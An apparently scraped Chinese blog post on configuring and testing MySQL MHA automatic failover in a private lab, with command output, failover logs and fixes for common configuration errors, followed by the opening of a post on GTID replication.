&#xA0;&#x65E5;&#x5FD7;&#x5B58;&#x653E;&#x4F4D;&#x7F6E;--ignore_last_failover&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#x5728;&#x7F3A;&#x7701;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;MHA&#x68C0;&#x6D4B;&#x5230;&#x8FDE;&#x7EED;&#x53D1;&#x751F;&#x5B95;&#x673A;&#xFF0C;&#x4E14;&#x4E24;&#x6B21;&#x5B95;&#x673A;&#x95F4;&#x9694;&#x4E0D;&#x8DB3;8&#x5C0F;&#x65F6;&#x7684;&#x8BDD;&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;Failover&#xFF0C;&#x4E4B;&#x6240;&#x4EE5;&#x8FD9;&#x6837;&#x9650;&#x5236;&#x662F;&#x4E3A;&#x4E86;&#x907F;&#x514D;ping-pong&#x6548;&#x5E94;&#x3002;&#x8BE5;&#x53C2;&#x6570;&#x4EE3;&#x8868;&#x5FFD;&#x7565;&#x4E0A;&#x6B21;MHA&#x89E6;&#x53D1;&#x5207;&#x6362;&#x4EA7;&#x751F;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MHA&#x53D1;&#x751F;&#x5207;&#x6362;&#x540E;&#x4F1A;&#x5728;&#x65E5;&#x5FD7;&#x76EE;&#x5F55;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x6211;&#x8BBE;&#x7F6E;&#x7684;/data&#x4EA7;&#x751F;app1.failover.complete&#x6587;&#x4EF6;&#xFF0C;&#x4E0B;&#x6B21;&#x518D;&#x6B21;&#x5207;&#x6362;&#x7684;&#x65F6;&#x5019;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x5C06;&#x4E0D;&#x5141;&#x8BB8;&#x89E6;&#x53D1;&#x5207;&#x6362;&#xFF0C;&#x9664;&#x975E;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5207;&#x6362;&#x540E;&#x6536;&#x5230;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#xFF0C;&#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x4E3A;--ignore_last_failover &#x7EE7;&#x7EED;&#x68C0;&#x67E5;MHA Manager&#x76D1;&#x63A7;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A;1234567[root@ctos7mini ~]&amp; masterha_check_status --conf=/etc/masterha/app1.cnfapp1 (pid:2803) is running(0:PING_OK), master:192.168.73.21[6]- Exit 1 nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1[7]+ Exit 1 nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1[root@ctos7mini ~]&amp; jobs[1]+ Running nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp;[root@ctos7mini ~]&amp; &#x53EF;&#x4EE5;&#x770B;&#x89C1;&#x5DF2;&#x7ECF;&#x5728;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x800C;&#x4E14;master&#x7684;&#x4E3B;&#x673A;&#x4E3A;192.168.73.21 &#xFF08;7&#xFF09;&#x67E5;&#x770B;&#x542F;&#x52A8;&#x65E5;&#x5FD7;123456789101112[root@ctos7mini ~]&amp; tail -n 10 /var/log/masterha/app1/manager.logFri May 6 23:16:28 2022 - [info] OK.Fri May 6 23:16:28 2022 - [warning] shutdown_script is not defined.Fri May 6 23:16:28 2022 - [info] Set master ping interval 1 seconds.Fri May 6 23:16:28 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.Fri May 6 23:16:28 2022 - [info] Starting ping health check on 192.168.73.21(192.168.73.21:3306)..Fri May 6 23:16:32 2022 - [warning] Got error when monitoring master: at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 446.Fri May 6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln448] Target master&apos;s advisory lock is already held by someone. Please check whether you monitor the same master from multiple monitoring processes.Fri May 6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln468] Error happened on health checking. at /usr/bin/masterha_manager line 50.Fri May 6 23:16:32 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Fri May 6 23:16:32 2022 - [info] Got exit code 1 (Not master dead).[root@ctos7mini ~]&amp; &#x6E05;&#x7A7A;&#x65E5;&#x5FD7;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x95ED;&#x76D1;&#x63A7;123456[root@ctos7mini ~]&amp; echo &gt; /var/log/masterha/app1/manager.log[root@ctos7mini ~]&amp; masterha_stop --conf=/etc/masterha/app1.cnfStopped app1 successfully.[1]+ Exit 1 nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1[root@ctos7mini ~]&amp; &#x7EE7;&#x7EED;&#x5F00;&#x542F;&#x76D1;&#x63A7; nohup masterha_manager --conf=/etc/masterha/app1.cnf --remove_dead_master_conf --ignore_last_failover &lt; /dev/null &gt; /var/log/masterha/app1/manager.log 2&gt;&amp;1 &amp; &#x89C2;&#x770B;&#x65E5;&#x5FD7;123456789101112[root@ctos7mini ~]&amp; tail -n 10 /var/log/masterha/app1/manager.logIN SCRIPT TEST====/usr/sbin/ip addr del 192.168.73.73/24 dev ens33 label ens33:1==/usr/sbin/ip addr add 192.168.73.73/24 brd 192.168.73.255 dev ens33 label ens33:1;/usr/sbin/arping -q -A -c 1 -I ens33:1 192.168.73.73;iptables -F;===Checking the Status of the script.. OKFri May 6 23:30:53 2022 - [info] OK.Fri May 6 23:30:53 2022 - [warning] shutdown_script is not defined.Fri May 6 23:30:53 2022 - [info] Set master ping interval 1 seconds.Fri May 6 23:30:53 2022 - [warning] secondary_check_script is not defined. It is highly recommended setting it to check master reachability from two or more routes.Fri May 6 23:30:53 2022 - [info] Starting ping health check on 192.168.73.21(192.168.73.21:3306)..Fri May 6 23:30:53 2022 - [info] Ping(SELECT) succeeded, waiting until MySQL doesn&apos;t respond..[root@ctos7mini ~]&amp; &#x5176;&#x4E2D;Ping(SELECT) succeeded, waiting until MySQL doesn&apos;t respond..&#x8BF4;&#x660E;&#x6574;&#x4E2A;&#x7CFB;&#x7EDF;&#x5DF2;&#x7ECF;&#x5F00;&#x59CB;&#x76D1;&#x63A7;&#x4E86; &#xFF08;9&#xFF09;&#x6A21;&#x62DF;&#x6545;&#x969C; &#x505C;&#x6389;MySQL&#x4E3B;&#x5E93; [root@rhel7 ~]# systemctl stop mysqld &#x67E5;&#x770B;&#x65E5;&#x5FD7;&#xFF0C;&#x89C2;&#x5BDF;&#x96C6;&#x7FA4;&#x72B6;&#x51B5;12345678910111213141516171819202122[root@ctos7mini ~]&amp; tail -n 20 /var/log/masterha/app1/manager.log----- Failover Report -----app1: MySQL Master failover 192.168.73.21 to 192.168.73.22 succeededMaster 192.168.73.21 is down!Check MHA Manager logs at ctos7mini:/var/log/masterha/app1/manager.log for details.Started automated(non-interactive) failover.Invalidated master IP address on 192.168.73.21.The latest slave 192.168.73.22(192.168.73.22:3306) has all relay logs for recovery.Selected 192.168.73.22 as a new master.192.168.73.22: OK: Applying all logs succeeded.192.168.73.22: OK: Activated master IP address.192.168.73.23: This host has the latest relay log events.Generating relay diff files from the latest slave succeeded.192.168.73.23: OK: Applying all logs succeeded. Slave started, replicating from 192.168.73.22.192.168.73.22: Resetting slave info succeeded.Master failover to 192.168.73.22(192.168.73.22:3306) completed successfully.[root@ctos7mini ~]&amp; &#x67E5;&#x770B;192.168.73.22&#x7684;slave&#x72B6;&#x6001;&#xFF1A;1234mysql&gt; show slave status\\GEmpty set (0.00 sec)mysql&gt; &#x67E5;&#x770B;192.168.73.23&#x7684;slave&#x72B6;&#x6001;12345678910111213141516171819202122232425262728mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.73.22 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-slave2.000002 Read_Master_Log_Pos: 1048 Relay_Log_File: ctos_sqlsrv-relay-bin.000002 Relay_Log_Pos: 323 Relay_Master_Log_File: mysql-slave2.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB:.................................................&#x7701;&#x7565;....................................................... Master_Server_Id: 3 Master_UUID: 90e5e492-cd2d-11ec-88d4-000c299254eb Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind:.................................................&#x7701;&#x7565;.......................................................1 row in set (0.00 sec)mysql&gt; &#x4E3B;&#x5E93;&#x53D8;&#x6210;&#x4E86;192.168.73.22&#xFF01; &#x67E5;&#x770B;&#x5907;&#x7528;&#x4E3B;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF1A;12345678910[root@ctos_sqlsrv ~]&amp; ip addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:0c:29:27:5c:d4 brd ff:ff:ff:ff:ff:ff inet 192.168.73.23/24 brd 192.168.73.255 scope global ens33 valid_lft forever preferred_lft forever inet 192.168.73.73/24 brd 192.168.73.255 scope global secondary ens33:1 valid_lft forever preferred_lft forever inet6 fe80::412f:a64f:e2ff:e154/64 scope link valid_lft forever preferred_lft forever[root@ctos_sqlsrv ~]&amp; ip&#x6F02;&#x79FB;&#x5230;&#x4E86;&#x5907;&#x7528;master&#x4E0A; &#x5F00;&#x542F;down&#x6389;&#x7684;master&#xFF0C;&#x624B;&#x52A8;&#x8FDB;&#x884C;&#x5207;&#x6362;&#x4E3B;&#x5E93;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162 [root@ctos7mini ~]&amp; masterha_master_switch --conf=/etc/masterha/app1.cnf --master_state=alive --new_master_host=192.168.73.21 --new_master_port=3306 --orig_master_is_new_slave --running_updates_limit=10000Sat May 7 03:08:13 2022 - [info] MHA::MasterRotate version 0.54.Sat May 7 03:08:13 2022 - [info] Starting online master switch..Sat May 7 03:08:13 2022 - [info]Sat May 7 03:08:13 2022 - [info] * Phase 1: Configuration Check Phase..Sat May 7 03:08:13 2022 - [info]Sat May 7 03:08:13 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Sat May 7 03:08:13 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Sat May 7 03:08:13 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Sat May 7 03:08:14 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)Sat May 7 03:08:14 2022 - [info] Alive Slaves:Sat May 7 03:08:14 2022 - [info] 192.168.73.22(192.168.73.22:3306) Version=5.7.24-log (oldest major version between slaves) log-bin:enabledSat May 7 03:08:14 2022 - [info] Replicating from 192.168.73.21(192.168.73.21:3306)Sat May 7 03:08:14 2022 - [info] Primary candidate for the new Master (candidate_master is set)Sat May 7 03:08:14 2022 - [info] 192.168.73.23(192.168.73.23:3306) Version=5.7.24-log (oldest major version between slaves) log-bin:enabledSat May 7 03:08:14 2022 - [info] Replicating from 192.168.73.21(192.168.73.21:3306)It is better to execute FLUSH NO_WRITE_TO_BINLOG TABLES on the master before switching. Is it ok to execute on 192.168.73.21(192.168.73.21:3306)? (YES/no): yesSat May 7 03:08:17 2022 - [info] Executing FLUSH NO_WRITE_TO_BINLOG TABLES. This may take long time..Sat May 7 03:08:17 2022 - [info] ok.Sat May 7 03:08:17 2022 - [info] Checking MHA is not monitoring or doing failover..Sat May 7 03:08:17 2022 - [info] Checking replication health on 192.168.73.22..Sat May 7 03:08:17 2022 - [info] ok.Sat May 7 03:08:17 2022 - [info] Checking replication health on 192.168.73.23..Sat May 7 03:08:17 2022 - [info] ok.Sat May 7 03:08:17 2022 - [info] 192.168.73.21 can be new master.Sat May 7 03:08:17 2022 - [info]From:192.168.73.21 (current master) +--192.168.73.22 +--192.168.73.23To:192.168.73.21 (new master) +--192.168.73.22 +--192.168.73.23 +--192.168.73.21Starting master switch from 192.168.73.21(192.168.73.21:3306) to 192.168.73.21(192.168.73.21:3306)? (yes/NO): yesSat May 7 03:08:19 2022 - [info] Checking whether 192.168.73.21(192.168.73.21:3306) is ok for the new master..Sat May 7 03:08:19 2022 - [info] ok.Sat May 7 03:08:19 2022 - [info] 192.168.73.21(192.168.73.21:3306): SHOW SLAVE STATUS returned empty result. To check replication filtering rules, temporarily executing CHANGE MASTER to a dummy host.Sat May 7 03:08:19 2022 - [info] 192.168.73.21(192.168.73.21:3306): Resetting slave pointing to the dummy host.Sat May 7 03:08:19 2022 - [info] ** Phase 1: Configuration Check Phase completed.Sat May 7 03:08:19 2022 - [info]Sat May 7 03:08:19 2022 - [info] * Phase 2: Rejecting updates Phase..Sat May 7 03:08:19 2022 - [info]Sat May 7 03:08:19 2022 - [info] Executing master ip online change script to disable write on the current master:Sat May 7 03:08:19 2022 - [info] /usr/local/bin/master_ip_online_change --command=stop --orig_master_host=192.168.73.21 --orig_master_ip=192.168.73.21 --orig_master_port=3306 --orig_master_user=&apos;root&apos; --orig_master_password=&apos;ccc.456&apos; --new_master_host=192.168.73.21 --new_master_ip=192.168.73.21 --new_master_port=3306 --new_master_user=&apos;root&apos; --new_master_password=&apos;ccc.456&apos;***************************************************************Disabling the VIP - 192.168.73.73/24 on old master: 192.168.73.21***************************************************************Got Error: Use of uninitialized value $orig_master_ssh_user in concatenation (.) or string at /usr/local/bin/master_ip_online_change line 101.Sat May 7 03:08:19 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln178] Got ERROR: at /usr/bin/masterha_master_switch line 53.[root@ctos7mini ~]&amp; masterha&#x6545;&#x969C;&#x89E3;&#x51B3;&#x6545;&#x969C;&#x4E00;&#xFF1A;12345678910111213141516Fri May 6 22:43:11 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May 6 22:43:11 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May 6 22:43:11 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May 6 22:43:11 2022 - [info] MHA::MasterMonitor version 0.54.Fri May 6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.22(192.168.73.22:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings. at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.Fri May 6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.23(192.168.73.23:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings. at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.Fri May 6 22:43:11 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln255] Got MySQL error when connecting 192.168.73.21(192.168.73.21:3306) :1045:Access denied for user &apos;root&apos;@&apos;192.168.73.20&apos; (using password: YES), but this is not mysql crash. Check MySQL server settings. at /usr/share/perl5/vendor_perl/MHA/ServerManager.pm line 251.Fri May 6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln263] Got fatal error, stopping operationsFri May 6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations. at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.Fri May 6 22:43:12 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Fri May 6 22:43:12 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK! mha&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x6216;&#x6CA1;&#x5F00;&#x542F;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5; &#x6545;&#x969C;&#x4E8C;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435Fri May 6 22:47:47 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Fri May 6 22:47:47 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Fri May 6 22:47:47 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Fri May 6 22:47:47 2022 - [info] MHA::MasterMonitor version 0.54.Fri May 6 22:47:48 2022 - [info] Dead Servers:Fri May 6 22:47:48 2022 - [info] Alive Servers:Fri May 6 22:47:48 2022 - [info] 192.168.73.21(192.168.73.21:3306)Fri May 6 22:47:48 2022 - [info] 192.168.73.22(192.168.73.22:3306)Fri May 6 22:47:48 2022 - [info] 192.168.73.23(192.168.73.23:3306)Fri May 6 22:47:48 2022 - [info] Alive Slaves:Fri May 6 22:47:48 2022 - [info] 192.168.73.22(192.168.73.22:3306) Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May 6 22:47:48 2022 - [info] Replicating from 192.168.73.21(192.168.73.21:3306)Fri May 6 22:47:48 2022 - [info] Primary candidate for the new Master (candidate_master is set)Fri May 6 22:47:48 2022 - [info] 192.168.73.23(192.168.73.23:3306) Version=5.7.24-log (oldest major version between slaves) log-bin:enabledFri May 6 22:47:48 2022 - [info] Replicating from 192.168.73.21(192.168.73.21:3306)Fri May 6 22:47:48 2022 - [info] Current Alive Master: 192.168.73.21(192.168.73.21:3306)Fri May 6 22:47:48 2022 - [info] Checking slave configurations..Fri May 6 22:47:48 2022 - [info] Checking replication filtering settings..Fri May 6 22:47:48 2022 - [info] binlog_do_db= ha, binlog_ignore_db= mysqlFri May 6 22:47:48 2022 - [info] Replication filtering check ok.Fri May 6 22:47:48 2022 - [info] Starting SSH connection tests..Fri May 6 22:47:52 2022 - [info] All SSH connection tests passed successfully.Fri May 6 22:47:52 2022 - [info] Checking MHA Node version..Fri May 6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln122] Got error when getting node version. Error:Fri May 6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln123]bash: apply_diff_relay_logs: command not foundFri May 6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm, ln151] node version on 192.168.73.22 not found! Maybe MHA Node package is not installed? at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 346.Fri May 6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations. node version on 192.168.73.22 not found! Maybe MHA Node package is not installed? at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 346. ...propagated at /usr/share/perl5/vendor_perl/MHA/ManagerUtil.pm line 152.Fri May 6 22:47:52 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Fri May 6 22:47:52 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK! MySQL&#x670D;&#x52A1;&#x5668;&#x6CA1;&#x6709;&#x5B89;&#x88C5;mha node&#x5DE5;&#x5177; &#x6545;&#x969C;&#x4E09;&#xFF1A; &#x5BFC;&#x81F4;&#x8BE5;&#x6545;&#x969C;&#x7684;&#x539F;&#x56E0;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x662F;&#x4F9D;&#x8D56;&#x5305;&#x5173;&#x7CFB;&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#xFF0C;&#x5177;&#x4F53;&#x9700;&#x8981;&#x6839;&#x636E;&#x5B9E;&#x65F6;&#x73AF;&#x5883;&#x5206;&#x6790;&#x89E3;&#x51B3; &#x53C2;&#x8003;&#x601D;&#x8DEF;&#xFF1A;&#x786E;&#x4FDD;MySQL&#x7684;libs&#x548C;libs-compat&#x5305;&#x5B89;&#x88C5;&#x4E86;&#xFF0C;&#x5B83;&#x63D0;&#x4F9B;&#x4E86;MySQL&#x9700;&#x8981;&#x7684;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;123456[root@ctos7mini ~]&amp; rpm -qa |grep mysql-communitymysql-community-common-5.7.24-1.el7.x86_64mysql-community-libs-compat-5.7.32-1.el7.x86_64mysql-community-libs-5.7.24-1.el7.x86_64mysql-community-server-5.7.24-1.el7.x86_64mysql-community-client-5.7.24-1.el7.x86_64 &#x6545;&#x969C;&#x56DB;&#xFF1A;12345678910Sat May 7 00:13:00 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Sat May 7 00:13:00 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Sat May 7 00:13:00 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Sat May 7 00:13:00 2022 - [info] MHA::MasterMonitor version 0.54.Sat May 7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln622] Master 192.168.73.21:3306 from which slave 192.168.73.23(192.168.73.23:3306) replicates is not defined in the configuration file!Sat May 7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations. at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.Sat May 7 00:13:01 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Sat May 7 00:13:01 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK! 12345678910Sat May 7 00:35:16 2022 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Sat May 7 00:35:16 2022 - [info] Reading application default configurations from /etc/masterha/app1.cnf..Sat May 7 00:35:16 2022 - [info] Reading server configurations from /etc/masterha/app1.cnf..Sat May 7 00:35:16 2022 - [info] MHA::MasterMonitor version 0.54.Sat May 7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/ServerManager.pm, ln193] There is no alive slave. We can&apos;t do failoverSat May 7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln386] Error happend on checking configurations. at /usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm line 300.Sat May 7 00:35:17 2022 - [error][/usr/share/perl5/vendor_perl/MHA/MasterMonitor.pm, ln482] Error happened on monitoring servers.Sat May 7 00:35:17 2022 - [info] Got exit code 1 (Not master dead).MySQL Replication Health is NOT OK! document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL的GTID主从同步","date":"2022-06-07T04:45:07.000Z","path":"/posts/d77fafec/","text":"MySQL GTID &#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x6982;&#x5FF5; &#x4ECE; MySQL 5.6.5 &#x5F00;&#x59CB;&#x65B0;&#x589E;&#x4E86;&#x4E00;&#x79CD;&#x57FA;&#x4E8E; GTID &#x7684;&#x590D;&#x5236;&#x65B9;&#x5F0F;&#x3002;&#x901A;&#x8FC7; GTID&#x4FDD;&#x8BC1;&#x4E86;&#x6BCF;&#x4E2A;&#x5728;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x5728;&#x96C6;&#x7FA4;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;ID&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5F3A;&#x5316;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E3B;&#x5907;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x6545;&#x969C;&#x6062;&#x590D;&#x4EE5;&#x53CA;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#x3002;&#x5728;&#x539F;&#x6765;&#x57FA;&#x4E8E;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x7684;&#x590D;&#x5236;&#xFF0C;&#x4ECE;&#x5E93;&#x9700;&#x8981;&#x544A;&#x77E5;&#x4E3B;&#x5E93;&#x8981;&#x4ECE;&#x54EA;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x540C;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x6307;&#x5B9A;&#x9519;&#x8BEF;&#x4F1A;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x9057;&#x6F0F;&#xFF0C;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x501F;&#x52A9;GTID&#xFF0C;&#x5728;&#x53D1;&#x751F;&#x4E3B;&#x5907;&#x5207;&#x6362;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MySQL&#x7684;&#x5176;&#x5B83;&#x4ECE;&#x5E93;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5728;&#x65B0;&#x4E3B;&#x5E93;&#x4E0A;&#x627E;&#x5230;&#x6B63;&#x786E;&#x7684;&#x590D;&#x5236;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x5927;&#x5927;&#x7B80;&#x5316;&#x4E86;&#x590D;&#x6742;&#x590D;&#x5236;&#x62D3;&#x6251;&#x4E0B;&#x96C6;&#x7FA4;&#x7684;&#x7EF4;&#x62A4;&#xFF0C;&#x4E5F;&#x51CF;&#x5C11;&#x4E86;&#x4EBA;&#x4E3A;&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x4F4D;&#x7F6E;&#x53D1;&#x751F;&#x8BEF;&#x64CD;&#x4F5C;&#x7684;&#x98CE;&#x9669;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x57FA;&#x4E8E;GTID&#x7684;&#x590D;&#x5236;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x51CF;&#x5C11;&#x4E86;&#x6570;&#x636E;&#x53D1;&#x751F;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x98CE;&#x9669;&#x3002; &#x4EC0;&#x4E48;&#x662F;GTID&#xFF1F;GTID (Global Transaction ID) &#x662F;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5DF2;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x7684;&#x7F16;&#x53F7;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x552F;&#x4E00;&#x7684;&#x7F16;&#x53F7;&#x3002; GTID &#x5B9E;&#x9645;&#x4E0A; &#x662F;&#x7531;UUID+TID &#x7EC4;&#x6210;&#x7684;&#x3002;&#x5176;&#x4E2D; UUID &#x662F;&#x4E00;&#x4E2A; MySQL &#x5B9E;&#x4F8B;&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x3002;TID&#x4EE3;&#x8868;&#x4E86;&#x8BE5;&#x5B9E;&#x4F8B;&#x4E0A;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x6570;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x968F;&#x7740;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x5355;&#x8C03;&#x9012;&#x589E;&#x3002; &#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E2A;GTID&#x7684;&#x5177;&#x4F53;&#x5F62;&#x5F0F;&#xFF1A;03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25&#xFF0C;&#x5192;&#x53F7;&#x5206;&#x5272;&#x524D;&#x8FB9;&#x4E3A;UUID&#xFF0C;&#x540E;&#x8FB9;&#x4E3A;TID&#x3002; GTID &#x96C6;&#x5408;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6765;&#x81EA;&#x591A;&#x4E2A; MySQL &#x5B9E;&#x4F8B;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x5B83;&#x4EEC;&#x4E4B;&#x95F4;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3002; 